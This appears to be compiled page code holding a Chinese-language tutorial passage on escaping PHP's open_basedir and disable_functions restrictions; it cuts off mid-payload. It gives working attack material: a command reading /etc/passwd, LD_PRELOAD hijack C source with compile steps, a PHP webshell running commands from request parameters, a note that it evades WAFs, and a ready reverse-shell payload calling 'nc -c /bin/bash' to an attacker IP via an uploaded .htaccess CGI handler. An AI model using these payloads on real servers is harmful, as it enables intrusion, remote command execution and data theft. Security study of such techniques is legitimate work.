的设置对system等命令执行函数是无效的，所以可以用命令执行函数来访问限制目录")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(p.b)("pre",c({parentName:"div"},{className:"language-bash"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-bash"}),"system",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token string"}),'"cat ../../../../../etc/passwd"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";")))),Object(p.b)("p",null," 但是命令执行函数一般都会被限制在disable_function当中，所以我们需要寻找其他的途径来绕过限制 "),Object(p.b)("h3",{className:"__internal",id:"2、glob-数据流包装器"},"2、glob:// 数据流包装器",Object(p.b)("a",c({parentName:"h3"},{href:"#2%E3%80%81glob-%E6%95%B0%E6%8D%AE%E6%B5%81%E5%8C%85%E8%A3%85%E5%99%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"glob是用来筛选目录的伪协议，筛选时不受",Object(p.b)("inlineCode",{parentName:"p"},"open_basedir"),"制约 ")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"if")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$b")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"opendir"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"glob:///var/www/html/*.php"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"while")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$file")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"readdir"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"!==")," ",Object(p.b)("span",c({parentName:"code"},{className:"token boolean constant"}),"false")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"filename:"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$file"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"\\n"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"closedir"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}")))),Object(p.b)("p",null,"更多方法参见",Object(p.b)("a",c({parentName:"p"},{href:"https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html",target:"_blank"}),"P牛的博客")),Object(p.b)("h1",{className:"__internal",id:"绕过disable_fuction"},"绕过disable_fuction",Object(p.b)("a",c({parentName:"h1"},{href:"#%E7%BB%95%E8%BF%87disable_fuction","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"利用dl函数"},Object(p.b)("strong",{parentName:"h3"},"利用DL()函数"),Object(p.b)("a",c({parentName:"h3"},{href:"#%E5%88%A9%E7%94%A8dl%E5%87%BD%E6%95%B0","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"dl( ) 函数允许在php脚本里动态加载php模块，默认是加载extension_dir目录里的扩展"),Object(p.b)("p",null,"该选项是PHP_INI_SYSTEM范围可修改的，只能在php.ini或者apache主配置文件里修改。"),Object(p.b)("p",null,"也可以通过enable_dl选项来关闭动态加载功能，而这个选项默认为On的"),Object(p.b)("p",null,"可以用",Object(p.b)("inlineCode",{parentName:"p"},"../"),"这种目录遍历的方式指定加载任何一个目录里的so等扩展文件"),Object(p.b)("p",null,"所以我们可以上传自己的so文件，并且用dl函数加载这个so文件执行命令"),Object(p.b)("h3",{className:"__internal",id:"ld_preload-环境变量"},Object(p.b)("strong",{parentName:"h3"},"LD_PRELOAD 环境变量"),Object(p.b)("a",c({parentName:"h3"},{href:"#ld_preload-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"LD_PRELOAD 是Linux的环境变量，它允许定义在程序运行前优先加载的动态链接库 "),Object(p.b)("p",null,"在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件"),Object(p.b)("p",null,"so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"c"},Object(p.b)("pre",c({parentName:"div"},{className:"language-c"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-c"}),Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//bypass_disablefuc.c"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token macro property"}),"#",Object(p.b)("span",c({parentName:"span"},{className:"token directive keyword"}),"define")," _GNU_SOURCE"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token macro property"}),"#",Object(p.b)("span",c({parentName:"span"},{className:"token directive keyword"}),"include")," ",Object(p.b)("span",c({parentName:"span"},{className:"token string"}),"<stdlib.h>")),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token macro property"}),"#",Object(p.b)("span",c({parentName:"span"},{className:"token directive keyword"}),"include")," ",Object(p.b)("span",c({parentName:"span"},{className:"token string"}),"<stdio.h>")),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token macro property"}),"#",Object(p.b)("span",c({parentName:"span"},{className:"token directive keyword"}),"include")," ",Object(p.b)("span",c({parentName:"span"},{className:"token string"}),"<string.h>")),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"extern")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"char"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"*"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"*")," environ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n__attribute__ ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"__constructor__",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"void")," preload ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"void"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"const")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"char"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"*")," cmdline ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"getenv"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token string"}),'"EVIL_CMDLINE"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"if")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"getenv"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token string"}),'"LD_PRELOAD"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"==")," ",Object(p.b)("span",c({parentName:"code"},{className:"token constant"}),"NULL"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"0"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"unsetenv"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token string"}),'"LD_PRELOAD"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"system"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"cmdline",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"system"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"cmdline",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),"\n\n",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//编译成动态链接库"),"\ngcc ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"shared ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"fPIC bypass_disablefuc",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"c ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"o bypass_disablefunc_x64",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"so\n    \n",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//若目标为 x86 架构，需要加上 -m32"),"\ngcc ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"shared ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"fPIC bypass_disablefuc",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"c ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"m32 ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"o bypass_disablefunc_x32",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"so"))),Object(p.b)("p",null,"再写一个PHP， 用putenv添加环境变量(一个是上传的so库地址、一个是要执行的命令)。"),Object(p.b)("p",null,"将system命令输出内容写入指定文件，然后读出。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"//bypass_disablefunc.php \n",Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n \t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/html/bypass_disablefunc_x64.so </p>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_REQUEST"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"cmd"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n   ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$out_path")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_REQUEST"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"outpath"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n   ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$evil_cmdline")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'" > "')," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$out_path")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'" 2>&1"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n   ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<p> <b>cmdline</b>: "')," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$evil_cmdline")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"</p>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n   ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"putenv"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"EVIL_CMDLINE="')," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$evil_cmdline"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n   ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$so_path")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_REQUEST"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"sopath"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n   ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"putenv"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"LD_PRELOAD="')," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$so_path"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n   ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mail"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n   ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<p> <b>output</b>: <br />"')," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"nl2br"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"file_get_contents"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$out_path"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"</p>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"unlink"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$out_path"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"将编译成的",Object(p.b)("strong",{parentName:"p"},"动态链接库"),"和",Object(p.b)("strong",{parentName:"p"},"php文件"),"上传到目标网站根目录。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(p.b)("pre",c({parentName:"div"},{className:"language-bash"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-bash"}),Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"#用法如下"),"\nhttp://xx.com/bypass_disablefunc.php?cmd",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"ls",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"code"},{className:"token assign-left variable"}),"outpath"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"/tmp/ss",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"code"},{className:"token assign-left variable"}),"sopath"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"/var/www/html/bypass_disablefunc_x64.so"))),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"PHP 支持putenv()、mail() 即可，甚至无需安装 sendmail。 (",Object(p.b)("strong",{parentName:"p"},"此方法还可用于过WAF"),")")),Object(p.b)("h3",{className:"__internal",id:"fastcgiphp-fpm"},Object(p.b)("strong",{parentName:"h3"},"Fastcgi/PHP-FPM"),Object(p.b)("a",c({parentName:"h3"},{href:"#fastcgiphp-fpm","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"Fastcgi 是一种通讯协议，用于Web服务器与后端语言的数据交换；"),Object(p.b)("p",null,"PHP-FPM 则是php环境中对Fastcgi协议的管理程序实现"),Object(p.b)("p",null,"Nginx为fastcgi 提供了 fastcgi_param 来主要处理映射关系，将 Nginx 中的变量翻译成 PHP 能够理解的变量"),Object(p.b)("p",null,Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/AntSwordProject/ant_php_extension",target:"_blank"}),"蚁剑扩展"),"，用相应版本php编译即可 "),Object(p.b)("h3",{className:"__internal",id:"apache-mod-cgi"},Object(p.b)("strong",{parentName:"h3"},"Apache Mod CGI"),Object(p.b)("a",c({parentName:"h3"},{href:"#apache-mod-cgi","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"Mod CGI就是把PHP做为APACHE一个内置模块，"),Object(p.b)("p",null,"让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP"),Object(p.b)("p",null,"它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行"),Object(p.b)("p",null,"在phpinfo看到",Object(p.b)("inlineCode",{parentName:"p"},"Server API -> CGI/FastCGI"),"，就可以确定是以cgi模式运行的了。"),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"要求")),Object(p.b)("blockquote",null,Object(p.b)("ol",{parentName:"blockquote"},Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"apache且运行mod_cgi模式"),Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"web目录可写"),Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"允许.htaccess生效"))),Object(p.b)("p",null,"在.htaccess 中添加以下内容，指定.dazzle为结尾的文件为CGI脚本程序并且允许本目录执行，我们只要同时上传一个.dazzle的shell就可以了。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(p.b)("pre",c({parentName:"div"},{className:"language-bash"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-bash"}),"Options +ExecCGI\nAddHandler cgi-script .dizzle"))),Object(p.b)("p",null,"现成payload - 》反弹shell："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),"\"nc -c '/bin/bash' 攻击者IP 6666\""),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//command to be executed"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$shellfile")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"#!/bin/bash\\n"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//using a shellscript"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$shellfile")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"echo -ne \\"Content-Type: text/html\\\\n\\\\n\\"\\n"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//header is needed, otherwise a 500 error is thrown when there is output"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$shellfile")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"',Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd")),'"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//executing $cmd"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"checkEnabled"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$text"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$condition"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$yes"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$no"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//this surely can be shorter"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"',Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$text")),': "')," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$condition")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"?")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$yes")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),":")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$no"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br>\\n"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"!"),Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"isset"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'checked'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    @",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"file_put_contents"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'.htaccess'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"\\nSetEnv HTACCESS on"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token constant"}),"FILE_APPEND"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//Append it to a .htaccess file to see whether .htaccess is allowed"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"header"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'Location: '")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," 